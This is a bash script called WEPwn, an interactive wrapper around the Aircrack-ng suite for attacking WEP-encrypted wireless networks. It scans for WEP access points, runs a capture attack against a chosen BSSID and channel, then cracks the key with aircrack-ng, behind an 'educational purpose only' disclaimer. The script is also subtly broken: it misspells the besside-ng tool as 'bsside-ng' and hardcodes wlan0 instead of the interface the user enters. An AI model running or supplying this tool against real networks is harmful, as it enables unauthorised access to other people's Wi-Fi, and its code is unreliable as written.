#!/bin/bash

# CODED BY JAYSON CABRILLAS SAN BUENAVENTURA WITH <3
# USE THIS TOOL AT YOUR OWN RISK.
# I <3 OPEN SOURCE.

# TERMINAL COLORS
NO_COLOR="\e[0m"
WHITE="\e[0;17m"
BOLD_WHITE="\e[1;37m"
BLACK="\e[0;30m"
BLUE="\e[0;34m"
BOLD_BLUE="\e[1;34m"
GREEN="\e[0;32m"
BOLD_GREEN="\e[1;32m"
CYAN="\e[0;36m"
BOLD_CYAN="\e[1;36m"
RED="\e[0;31m"
BOLD_RED="\e[1;31m"
PURPLE="\e[0;35m"
BOLD_PURPLE="\e[1;35m"
BROWN="\e[0;33m"
BOLD_YELLOW="\e[1;33m"
GRAY="\e[0;37m"
BOLD_GRAY="\e[1;30m"

# CHECK IF USER IS ROOT
function check_sudo() {
  if [[ "$EUID" -ne 0 ]]; then
    clear
    banner
    printf "%b\n" "      Error! This script must be run as root. Use sudo." >&2
    exit 1
  fi
}

# MY BANNER
function banner() {
  clear
  echo ""
  echo -e "$BOLD_RED       888       888 8888888888 8888888b.       $BOLD_YELLOW Powered by $BOLD_RED"
  echo -e "       888   o   888 888        888   Y88b   $BOLD_YELLOW Aircrack-ng Suite  $BOLD_RED"
  echo -e "       888  d8b  888 888        888    888                        "
  echo -e "       888 d888b 888 8888888    888   d88P 888  888  888 88888b.  "
  echo -e "       888d88888b888 888        8888888P   888  888  888 888  88b "
  echo -e "       88888P Y88888 888        888        888  888  888 888  888 "
  echo -e "       8888P   Y8888 888        888        Y88b 888 d88P 888  888 "
  echo -e "       888P     Y888 8888888888 888          Y8888888P   888  888 $NO_COLOR"
  echo ""
  echo -e "      ┌──────────────────────────────────────────────────────────┐"
  echo -e "      │$BOLD_BLUE    Coded by $BOLD_RED     :$BOLD_YELLOW Jayson Cabrillas San Buenaventura$NO_COLOR     │"
  echo -e "      │$BOLD_BLUE    Github   $BOLD_RED     :$BOLD_YELLOW http://github.com/mkdirlove $NO_COLOR          │"
  echo -e "      │$BOLD_BLUE    Organization $BOLD_RED :$BOLD_YELLOW https://github.com/WirelessPwnPH $NO_COLOR     │"
  echo -e "      └──────────────────────────────────────────────────────────┘"
  echo ""
}

# SCAN FOR TARGET AP THEN ATTACK
function scan_attack() {
  banner
  echo ""
  read -p "     Enter wireless interface(wlan0): " iface
  xterm -hold -e 'while [ 1 ]; do airodump-ng wlan0 --encrypt wep ;done' &
  read -p "     Enter target bssid: " bssid
  read -p "     Enter channel: " channel
  bsside-ng $iface -c $channel -b $bssid
  echo ""
  read -p "     Enter the capture file path: " file
  aircrack-ng $file
  echo ""
  read -p "      Back (y/n)?: " opt
  if [[ $opt == "y" || $opt == "Y" ]]; then
    main
  elif [[ $opt == "n" || $opt == "N" ]]; then
    exit
  else
    clear
    exit
  fi
}

# ABOUT THE TOOL
function about() {
  banner
  echo -e "$BOLD_YELLOW      This tool is for educational purpose only."
  echo -e "      This tool is powered by Aircrack-ng Suite"
  echo -e "      This tool attacks WEP encrypted networks."
  echo -e "      Thank you for using this tool. $BOLD_RED"
  echo ""
  read -p "      Back (y/n)?: " opt
  if [[ $opt == "y" || $opt == "Y" ]]; then
    main
  elif [[ $opt == "n" || $opt == "N" ]]; then
    exit
  else
    clear
    exit
  fi
}

# ABOUT THE AUTHOR
function author() {
  banner
  echo -e "$BOLD_YELLOW      My name is Jayson Cabrillas San Buenaventura"
  echo -e "      a 2nd year BSIT student who loves to develop open source"
  echo -e "      stuffs that will break other stuffs."
  echo -e "      I love wireless prenetration testing."
  echo -e "      I <3 open source. $BOLD_RED"
  echo ""
  read -p "      Back (y/n)?: " opt
  if [[ $opt == "y" || $opt == "Y" ]]; then
    main
  elif [[ $opt == "n" || $opt == "N" ]]; then
    exit
  else
    clear
    exit
  fi
}

# MAIN FUNCTION
function main() {
  check_sudo
  banner
  echo ""
  echo -e "$BOLD_BLUE       [01] Start WEPwn                    [03] About the Author"
  echo -e "$BOLD_BLUE       [02] About WEPwn     $BOLD_RED               [00] Exit WEPwn $NO_COLOR"
  echo -e ""
  echo -e "$BOLD_RED"
  echo -e "       ┌─[user@wepwn]─[~]"
  read -p "       └──╼ # " opt
  echo ""

  if [[ $opt -eq "01" || $opt -eq "1" ]]; then
    scan_attack
  elif [[ $opt -eq "02" || $opt -eq "2" ]]; then
      about
  elif [[ $opt -eq "03" || $opt -eq "3" ]]; then
      author
  elif [[ $opt -eq "00" || $opt -eq "0" ]]; then
      sleep 2
      clear
      exit
  else
      echo -e "$BOLD_RED       Please input a valid character!"
      echo ""
    fi
}

# MAIN ARGUMENT
main
